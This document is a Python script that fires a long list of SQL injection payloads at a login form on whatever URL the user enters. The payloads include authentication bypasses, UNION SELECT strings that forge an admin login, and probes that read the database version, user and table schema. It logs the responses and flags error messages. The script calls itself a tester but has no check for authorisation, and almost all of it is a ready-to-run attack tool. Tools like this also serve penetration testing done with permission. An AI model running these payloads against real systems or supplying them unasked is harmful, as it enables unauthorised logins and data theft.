import requests

# Prompt the user for the target URL
url = input("Enter the target URL for SQL Injection testing: ")

# Log file to store results
logfile = "sql_injection_test_results.log"

# Payloads to test
payloads = [
    "-", " ", "&", "^", "",
    " or \"\"-", " or \"\" ", " or \"\"&", " or \"\"^", " or \"\"",
    "or true--", "\" or true--", "' or true--", "\") or true--", "') or true--",
    "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x", "\" or \"x\"=\"x",
    "\") or (\"x\")=(\"x", "\")) or ((\"x\"))=((\"x", "or 1=1", "or 1=1--",
    "or 1=1#", "or 1=1/*", "admin'--", "admin' #", "admin'/*",
    "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#",
    "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin' or 1=1",
    "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*",
    "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--",
    "admin') or '1'='1'#", "admin') or '1'='1'/*",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
    "admin\"--", "admin\"#", "admin\"/*", "admin\" or \"1\"=\"1",
    "admin\" or \"1\"=\"1\"--", "admin\" or \"1\"=\"1\"#", "admin\" or \"1\"=\"1\"/*",
    "admin\"or 1=1 or \"\"=\"", "admin\" or 1=1", "admin\" or 1=1--",
    "admin\" or 1=1#", "admin\" or 1=1/*", "admin\") or (\"1\"=\"1",
    "admin\") or (\"1\"=\"1\"--", "admin\") or (\"1\"=\"1\"#", "admin\") or (\"1\"=\"1\"/*",
    "admin\") or \"1\"=\"1", "admin\") or \"1\"=\"1\"--", "admin\") or \"1\"=\"1\"#",
    "admin\") or \"1\"=\"1\"/*", "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\"",
    "==", "=", "'", "'--", "'#", "'/*", "' and 1='1", "' and a='a", "or 1=1",
    "or true", "' or ''='", "\" or \"\"=\"", "1') and '1'=1--",
    "' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055'",
    "\" AND 1=0 UNION ALL SELECT \"\", \"81dc9bdb52d04dc20036dbd8313ed055\"",
    "and 1=1", "and 1=1--", "' and 'one'='one", "' and 'one'='one--",
    "' group by password having 1=1--", "' group by userid having 1=1--",
    "' group by username having 1=1--", "like '%'", "or 0=0 --", "or 0=0 #",
    "or 0=0 /*", "' or 0=0 --", "' or 0=0 #", "' or 0=0 /*",
    "\" or 0=0 --", "\" or 0=0 #", "\" or 0=0 /*", "%' or '0'='0",
    "' or '1'='1", "' or '1'='1'--", "' or '1'='1'/*", "' or '1'='1'#",
    "') or '1'='1", "') or '1'='1'--", "') or '1'='1'#", "or '1'='1",
    "or '1'='1'--", "or '1'='1'#", "or 1=1 LIMIT 1;#",
    "'or 1=1 or ''='", "\"or 1=1 or \"\"=\"", "' or 'a'='a",
    "' or a=a--", "') or ('a'='a", "\" or \"a\"=\"a", "') or (\"a\"=\"a",
    "') or 'one'='one", "' or 'one'='one--", "' or uid like '%",
    "' or uname like '%", "' or userid like '%", "' or user like '%",
    "' or username like '%", "' or 'x'='x", "') or ('x'='x",
    "\" or \"x\"=\"x", "' OR 'x'='x'#;", "' UNION ALL SELECT 1, @@version;#",
    "' UNION ALL SELECT system_user(),user();#",
    "' UNION select table_schema,table_name FROM information_Schema.tables;#",
    "admin' and substring(password/text(),1,1)='7",
    "' and substring(password/text(),1,1)='7",
    "' or 1=1 limit 1 -- -+"
]

# Clear the log file
with open(logfile, "w") as log:
    log.write(f"Starting SQL Injection Test for URL: {url}\n\n")

# Total payloads
total_payloads = len(payloads)
vulnerable_count = 0

# Iterate through each payload
for payload in payloads:
    print(f"Testing payload: {payload}")
    data = {"email": payload, "password": payload}
    
    # Send POST request
    response = requests.post(url, data=data)
    
    # Log the response
    with open(logfile, "a") as log:
        log.write(f"Testing payload: {payload}\n")
        log.write(f"Response:\n{response.text}\n")
        log.write("-" * 40 + "\n")
    
    # Check for specific keywords indicating potential vulnerability
    if any(keyword in response.text for keyword in ["error", "syntax", "unexpected"]):
        print(f"Potential vulnerability detected with payload: {payload}")
        with open(logfile, "a") as log:
            log.write(f"Potential vulnerability detected with payload: {payload}\n")
        vulnerable_count += 1

# Calculate percentage of vulnerabilities
vulnerability_percentage = (vulnerable_count / total_payloads) * 100

# Summary
summary = (
    f"SQL Injection Test Completed. Results saved to {logfile}.\n"
    f"Total payloads tested: {total_payloads}\n"
    f"Potential vulnerabilities found: {vulnerable_count}\n"
    f"Vulnerability percentage: {vulnerability_percentage:.2f}%\n"
)
print(summary)
with open(logfile, "a") as log:
    log.write(summary)
